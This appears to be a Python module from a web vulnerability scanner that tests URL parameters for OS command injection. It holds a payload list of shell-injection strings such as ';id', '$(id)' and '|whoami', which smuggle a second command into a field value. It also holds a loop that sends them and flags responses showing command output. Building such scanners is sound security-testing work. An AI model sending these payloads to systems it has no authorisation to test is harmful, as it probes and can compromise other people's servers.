from ..core.client import fetch
from ..core.utils import extract_params
from urllib.parse import urlparse, urlencode, quote

PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    (";uname -a", "Linux"),
    ("|whoami", "nt authority"),
    ("&whoami", "nt authority"),
]


def check_cmdi(url):
    findings = []
    base = url.split("?")[0] if "?" in url else url
    params = extract_params(url) or ["q", "search", "cmd", "exec", "ping", "host", "ip"]

    for param in params:
        for payload, evidence in PAYLOADS:
            u = f"{base}?{param}={quote(payload)}"
            s, h, b = fetch(u, timeout=8)
            if s and evidence in b:
                findings.append({
                    "name": f"CMDi ({param})",
                    "severity": "CRITICAL",
                    "url": u,
                    "payload": payload,
                    "evidence": evidence
                })
                break
    return findings
